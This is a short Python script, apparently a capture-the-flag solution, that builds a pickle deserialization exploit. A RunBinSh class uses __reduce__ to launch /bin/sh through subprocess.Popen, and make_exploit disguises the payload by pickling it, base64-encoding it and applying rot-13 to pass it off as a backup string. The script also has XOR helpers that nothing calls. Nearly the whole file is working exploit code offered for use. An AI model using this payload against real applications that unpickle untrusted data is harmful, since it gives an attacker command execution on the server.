import pickle
import base64
import codecs
import subprocess

def encode(obj):
    string = pickle.dumps(obj)
    return base64.b64encode(string)

def decode(string):
    decoded_string = base64.b64decode(string)
    return pickle.loads(decoded_string)

def bxor(b1, b2): # use xor for bytes
    parts = []
    for b1, b2 in zip(b1, b2):
        parts.append(bytes([b1 ^ b2]))
    return b''.join(parts)

def xor(a1, b1):
	encrypted = [ (a ^ b) for (a,b) in zip(a1, b1) ]
	return bytes(encrypted)

def make_backup_string(obj):
    string = pickle.dumps(obj)
    encoded = base64.b64encode(string).decode()
    return codecs.encode(encoded, "rot-13")


class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (('/bin/sh',),))

def make_exploit():
    return make_backup_string(RunBinSh())
